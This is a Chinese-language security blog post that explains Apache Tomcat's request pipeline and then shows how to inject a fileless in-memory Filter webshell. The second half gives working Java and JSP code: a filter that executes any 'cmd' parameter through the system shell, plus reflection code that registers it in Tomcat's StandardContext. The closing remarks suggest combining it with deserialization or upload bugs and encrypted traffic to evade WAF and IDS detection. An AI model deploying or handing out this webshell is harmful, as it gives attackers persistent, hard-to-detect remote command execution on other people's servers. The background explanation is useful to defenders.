> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)

###### **欢迎光临鲸落的杂货铺****![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1BibhCxcSH5y2628QmvqnWb0soxI7mRmItc4VzJ1hmNibEMypKw30Nc4g/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1ibxK0BkAfajLuhFia3tvicsxXA0r201FkCPYZGeUkoe91y3KJKTj2kicQw/640?wx_fmt=png)

###### **背景：**

基于现阶段红蓝对抗强度的提升，诸如 WAF 动态防御、态势感知、IDS 恶意流量分析监测、文件多维特征监测、日志监测等手段，能够及时有效地检测、告警甚至阻断针对传统通过文件上传落地的 Webshell 或需以文件形式持续驻留目标服务器的恶意后门。

近几年来，反序列化漏洞的盛行一时，由于其天然的编码非明文属性，对绕过多种安全检测手段颇有效果，结合当下形势，对 Tomcat 容器如何利用过滤器实现无文件落地的内存 Webshell 进行研究学习。

###### **声明 ：**

  由于传播或利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，此文仅作交流学习用途。

###### **概念：**

  援引官方文档对于 javax.servlet.Filter 接口的描述，针对 Filter 进行以下几点阐述：

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1poRiaAzSyVW2j3pvDhZDWXVDyo0llpHJCHYoxWakLT02hda2wEJOYUQ/640?wx_fmt=png)

图 1  Filter 接口描述  

**一、**Filter 是什么?****

   “A filter is an object that performs filtering tasks on either the request to a resource (a servlet or static content), or on the response from a resource, or both.”

 Filter 也称过滤器，是针对访问 Servlet、静态资源的请求或响应进行过滤操作的对象。

**二、**Filter 如何被创建？****

     “Filters are configured in the deployment descriptor of a web application.”

  Filter 可在 /WEB-INF/web.xml 文件中进行配置:

    Filter-name: 过滤器名称

    Filter-class: 过滤器类名

    Url-pattern: 匹配请求路径的模式 

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF13tMWsm7XksrJOibNicEqBL6WUm3IoVNoWxwwITjxe16licszS7CKVicjicQ/640?wx_fmt=png)

图 2  Filter 配置  

**三、**Filter 在 Tomcat 处理请求响应的流程中，处于哪个环节？****

  首先对 Tomcat 处理请求的流程进行了解：

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1rY9Z238LweVb6efbakTOGZbfQIz0NIMmMTppicYJy1odqUiaw4fPrubg/640?wx_fmt=png)

图 3  Server 架构  

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1VIcQHuIyVaLsIaQT6msE9WTJqjLhlrLzW1a3fZQPgguQoHso4OFibyQ/640?wx_fmt=png)

图 4  Server.xml 配置文件  

在 Tomcat 中，最顶层的容器是 Server，一个 Tomcat 仅有一个 Server，指代整个 Web 服务器。

Server 当中，包含了多个 Service 用以提供具体的服务。

Service 当中，又包含了多个 Connector 以及 Container 组件。

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1ic6ubF1pXgCxR4LtupfnfGRzW5KiaUsfTGOybsv6IofjAdd28xN2fibhg/640?wx_fmt=png)

图 5  Connector 架构

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1XtRSdqtSBKsHUw62wuCrzLE02IcRc2wxk5wSGkv7ut5fhOmo0vKtrQ/640?wx_fmt=png)

图 6  Connector 配置细节   

  Connector，也称为连接器，用于接受请求并将请求封装成 Request 和 Response 对象。

  在 Connector 中，包含了多个组件，不同的 ProtocolHandler 对应不同的协议解析，并以单独一个 Connector 形式存在，在 server.xml 配置文件当中，默认存在处理 HTTP/1.1 协议的 Connector，除此之外，Tomcat 还在注释中提供了处理 AJP/1.3 协议、SSL/TLS HTTP/1.1 协议的 Connector。（图 6 标签中 protocol 的值代表用于解析请求协议）

  ProtocolHandler 组件中，又包含了三个组件：  

  Endpoint：负责处理底层 Socket 的网络连接，读取请求的字节码，实现 TCP/IP 协议

Aceptor：用于监听请求

Handler：用于处理接收到的 Socket 流，并随后调用 Processor 进行处理

AsyncTimeout：用于检查异步 Request 的超时

Processor：负责完成应用层的协议如 HTTP/1.1、AJP/1.3 的解析工作

Adaptor：负责将解析后的 org.apache.coyote.Request 对象或 Response 对象，适配为可供 Container 调用的继承了 ServletRequest 接口、ServletResponse 接口的对象。

  请求经 Connector 处理完毕后，传递给 Container 进行处理：

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1vIZJ9ibQ7FmIvROhColsn3kX8h4oasxjuztOEhOWRR931ibIYMkH9pfw/640?wx_fmt=png)

图 7  Engine 架构  

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1MWvAW6oLuJTAfPKU5YsTbuoSFBhfcvj4O2NSueT3Kn8WdfdibL1DkFA/640?wx_fmt=png)

图 8  Engine 配置细节  

  在 Engine 当中，存在以下几个逐层包含的组件：

  Host：代表一个虚拟主机

  Context：代表 Webapps（默认应用文件夹，可更改) 里单独某个 Web 应用，与 /WEB-INF/web.xml 相对应

  Wrapper：每个 Wrapper 中封装了一个 Servlet

  我们可以在配置文件中窥探出 Tomcat 架构其一角，Engine 可拥有多个 Host，代表不同的虚拟主机，使得 Tomcat 具备承担多个域名服务的能力，图 8 标签中的”appBase” 指代放置 Web 应用项目的文件夹名称，”autoDeploy” 指代是否开启 WAR 包的自动装配功能

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1z4EA3XlHXMYFrFMSicTMq6b9lZFcjwBe3JqozvmIXPFH8zZIvib0PMTw/640?wx_fmt=png)

图 9  PipeLine 处理流程  

  在 Container 中，使用 PipeLine-Value 管道的方式处理请求，包含以下四个子容器：

StandardEngineValue --> StandardHostValue --> StandardContextValue --> StandardWrapperValue

    当执行到最后的 StandardWrapperValue 时，将通过 ApplicationFilterFactory 对象的 createFilterChain() 方法，创建 FilterChain(过滤链)，并调用 FilterChain.doFilter() 方法，对请求进行过滤操作。

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1X7ZNv5KteAxmyor7Czm9dydCB6p1cTXtQSqiaeoUCDb3SnbHY6X5iafA/640?wx_fmt=png)

图 10  createFilterChain() 方法  

  综上所述，当客户端发起请求后，首先来到 Connector 组件，完成底层 TCP/IP 协议、应用层协议的解析工作，生成 org.apache.coyote.Request 对象，并将请求路径、请求头部、请求参数等数据保存其中，随后通过 Adaptor 组件适配为继承了 javax.servlet.ServletRequest 接口的 Request 对象，根据请求信息交由对应的域名 (Host)、对应的 Context(Web 应用程序)、对应的 Wrapper(Filter 过滤链和 Servlet) 进行处理并响应，当响应处理完成后，最终交由 Connector 返回给客户端。

  以上概念及流程叙述完毕，话不多说，开启 IDEA 调试跟我一起看看代码细节。

**四、**Filter 实例及其映射存储在何处？****

  是否记得在第二点”Filter 如何被创建” 中所提及的，Filter 一般在 web.xml 中进行配置，而继承了 org.apache.cataline.Context 接口的 org.apache.catalina.core.StandardContext 容器类负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系，因而我们可以从 StandardContext 容器类中着手。

  跟进 StandardContext 容器类的代码可以发现，与 Filter 有关的成员变量有以下三个：

```
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap();
```

  filterConfigs 变量存储了 filter 名称与相应的 ApplicationFilterConfig 对象，在 ApplicationFilterConfig 对象中则存储了 Filter 实例以及该实例在 web.xml 中的注册信息

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF14iajb7lZdQ5aCTiaqCO00BBIUm3ljkZhNSJPyVWjvvlZQva00DRMwZCg/640?wx_fmt=png)

图 11  ApplicationFilterConfig 类  

```
private HashMap<String, FilterDef> filterDefs = new HashMap();
```

  filterDefs 变量存储了 filter 名称与相应 FilterDef 的对象，而 FilterDef 对象则存储了 Filter 包括名称、描述、类名、Filter 实例在内等与 filter 自身相关的数据

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1XRleiaInj4eKic48QOwv5OeGATKwCbPyb2SKIAEbMUoH3WubTTUrbWpA/640?wx_fmt=png)

图 12  FilterDef 类  

```
private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
```

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1ibkvzPZxKqUllPbE0icRKTKrstYgXYlmn5vlfSRYIClp2R32jGNFtyYA/640?wx_fmt=png)

图 13  filterMaps 集合  

 filterMaps 中的 FilterMap 则记录了不同 filter 与 UrlPattern 的映射关系

小结一下：

 filterMaps 变量：含有所有 filter 的 URL 映射关系

    filterDefs 变量： 含有所有 filter 包括实例在内等变量

    filterConfigs 变量：含有所有与 filter 对应的 filterDef 信息及 filter 实例，并对 filter 进行管理

**五、**FilterChain 过滤链的创建及调用过程？****

续接上述内容，我们来看

org.apache.catalina.core.ApplicationFilterChain#createFilterChain()，FilterChain 的创建过程。

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1kofvicEr2WoaWvZaT4lC260N7bkCbyNrib6Mm02SHibauT5dxTU66rMlA/640?wx_fmt=png)

图 14  createFilterChain() 方法入口  

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1AibInM0vKiawyBhrMOVmJHCqKSuzR1bp5zNibdLxsmQNJibd0a2l7tjqrw/640?wx_fmt=png)

图 15  createFilterChain() 方法细节  

  获取 StandardContext 对象，关键部分在第二红框内，遍历 StandardContext.filterMaps 得到 filter 与 URL 的映射关系并通过 matchDispatcher()、matchFilterURL() 方法进行匹配，匹配成功后，还需判断 StandardContext.filterConfigs 中，是否存在对应 filter 的实例，当实例不为空时通过 addFilter 方法，将管理 filter 实例的 filterConfig 添加入 filterChain 对象中。

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF157icP8xrR7PHp27DdU2GnVKcVU5tK9HiaBAwxILBMZjEWyrnEZtiaFYNQ/640?wx_fmt=png)

图 16  调用过滤链  

  当遍历结束后，返回 filterChain 对象至 StandardWrapperValue 实例，并调用 filterChain.doFilter() 方法，对请求或响应进行过滤操作。

**六、**Filter 内存马的注入****

花了老半天功夫终于来到了最关心的地方。经过一系列分析，得知 createFilterChain() 通过遍历 filterMaps，根据请求的 URL 在 filterMaps 中匹配 filter，并在 filterConfigs 中找到 filter 的实例，最终创建 filterChain。因此，我们只需要向 StandardContext 实例的 filterMaps、filterDefs、filterConfigs 中添加恶意 Filter 相关参数，即可完成 Filter 马的注入。

> 借鉴于 potatso 前辈《tomcat 结合 shiro 无文件 webshell 的技术研究以及检测方法》
> 
> https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg

1. 编写恶意 Filter 类，转化为字节码并进行 Base64 编码（java8 后提供 java.util.Base64）  

```
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class FilterShell implements Filter{

public void init(FilterConfig filterConfig) throws ServletException {
    }

public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
if (req.getParameter("cmd") != null) {
boolean isLinux = true;
String osTyp = System.getProperty("os.name");
if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
String output = s.hasNext() ? s.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }
        filterChain.doFilter(request, response);
    }

public void destroy() {
    }

public static void main(String[] args) throws IOException {
        InputStream in = FilterShell.class.getClassLoader().getResourceAsStream("FilterShell.class");
        byte[] bytes = new byte[in.available()];
in.read(bytes);
        System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));
    }
}
```

2. 注入恶意 Filter 类

  获取 ClassLoader 实例，并通过反射得到 ClassLoader 类的 defineClass() 方法，将传入的恶意 Filter 类字节码，转化为 Class 注入至目标环境

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF10XGkszsapKoWqhGR0WfZUywgtszv5QywwW7HNaHn4LPz2wicufJVicmQ/640?wx_fmt=png)

图 17  java.lang.ClassLoader#defineClass()

```
<%
//  获取当前ClassLoader
java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();

// 由于defineClass方法的权限修饰符并非public，需通过反射得到
java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defineClass.setAccessible(true);
String evil_base64 = “恶意Filter类的base64编码”;
byte[] evil_bytes = java.util.Base64.getDecoder().decode(evil_base64);

// 加载字节码，注入恶意Filter类
defineClass.invoke(classLoader, evil_bytes, 0, evil_bytes.length);
```

3. 获取 StandardContext 实例

> 借鉴于 Litch1 前辈《Tomcat 的一种通用回显方法研究》
> 
> https://zhuanlan.zhihu.com/p/114625962

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1iaTES9laI4aYXBW2Rh3vZgG8vKyN4mF7xggrDRuw1icvPrpKFcR6O6ew/640?wx_fmt=png)

图 18  StandardContext 实例存储位置信息

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
org.apache.catalina.core.StandardContext standardContext = standardroot.getContext();
```

4. 向 filterMaps 添加 url 映射关系

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1JE5cOCkCYnULX4S1UfhA5Pmh4hvmzNaD6Sdfn65jmocHgWUcsmk7dg/640?wx_fmt=png)

图 19  StandardContext#addFilterMap 及 addFilterDef 方法  

  在 standardContext 类中已提供 addFilterMap 方法，同时关注到 this.validateFilterMap() 方法，跟进查看

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1O7qmjnVKbHTiaVkKZEJO2azUzicHxqr5SVxbmbtnburhlmrjQUeib0XNg/640?wx_fmt=png)

图 20  validateFilterMap() 方法细节  

  该方法会在当前 standardContext 实例中的 filterDefs 检查是否存在所添加的 filterName，因此我们需先往 standardContext.filterDefs 中添加我们的 filterDef，standardContext 类提供了 addFilterDef 方法可供调用。

```
// 添加filterDef，先前已注入恶意Filter类，可调用Class.forName()获取
javax.servlet.Filter filterShell = (javax.servlet.Filter) Class.forName("FilterShell").newInstance();
org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
filterDef.setFilterName("Filtershell");//可自行命名
filterDef.setFilter(filterShell);
standardContext.addFilterDef(filterDef);
standardContext.addFilterMap(filterMap);

// 实例化filterMap，filterMap#setFilterName()和filterMap#addURLPattern()都是public方法
org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
filterMap.setFilterName("Filtershell");
filterMap.addURLPattern("/*");
```

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1TDibNAfCWicxZGldU7w5iaT8Xwqtu9QTTibrCNiaL8GFKD3AOkxIkNYAQwQ/640?wx_fmt=png)

图 21  FilterMap#setFilterName 及 addURLPattern 方法  

5. 实例化 ApplicationFilterConfig，向 filterConfigs 添加 <String, ApplicationFilterConfig>

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1C6F6htHZict0CPufLiaQaq4F9VSVdibbjCdZ5KUcuicZtDc2mMNRYCWj1A/640?wx_fmt=png)

图 22  ApplicationFilterConfig 类

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1VWvG8LAoymPwVQN7EGYuzL8efPHR1ric9KTEHeFe2t9ibNFfgcYJ6hIA/640?wx_fmt=png)

图 23  filterConfigs 变量

```
<%
// 反射获取filterConfigs 
java.lang.reflect.Field filterConfigsF = standardContext.getClass().getDeclaredField("filterConfigs");
filterConfigsF.setAccessible(true);
java.util.Map filterConfigs = (java.util.Map) filterConfigsF.get(standardContext);

// 由于ApplicationFilterConfig经Final修饰，且构造方法为静态方法，无法通过new实例化，需通过反射获取ApplicationFilterConfig构造方法并实例化后添加入filterConfigs
java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructors()[0];
constructor.setAccessible(true);
filterConfigs.put("Filtershell", constructor.newInstance(standardContext, filterDef));
```

6. 注入完成后，验证 Filter 内存马

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1VIxmYAlB4deLKNF73bUYELREoyTynFibbwIYfNskmWZJECugtCS1mvg/640?wx_fmt=png)

图 24  whoami 命令

![](https://mmbiz.qpic.cn/mmbiz_png/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1qE5TpbLkpeQ3q7yOfpjNgH0dYD1du4na7kXJssq3IFb5ictkdztutpQ/640?wx_fmt=png)

图 25  netstat 命令

**末言：**  

  以上获取 StandardContext 实例的方法不适用于 Tomcat7。利用反序化漏洞、代码执行漏洞、文件上传漏洞，完成 Filter 内存马的注入后，可结合其他攻击手法如采用冰蝎的 AES 动态加密 Webshell、使用伪造的 HTTPS 证书进行流量加密或自定义编解码方式，进而达到流量混淆规避监测等效果。然一法通，万剑归宗，在设计理念和架构思想较为统一的情况下，可利用该思路扩展 Tomcat 容器甚至其他 Web 容器、框架的攻防方法。以上行文，难免存在谬误，后续将逐渐完善，整合和分析更多的 Tomcat 容器攻防方式。

![](https://mmbiz.qpic.cn/mmbiz_jpg/1oVoayJic3GzBcz4Q1EHyicB3mWv2HibyF1Z7fSwvhr8GWv8xBjvGxkel8ERZZicHXjZ93G91So1PZfnUic5aV0iaueQ/640?wx_fmt=jpeg)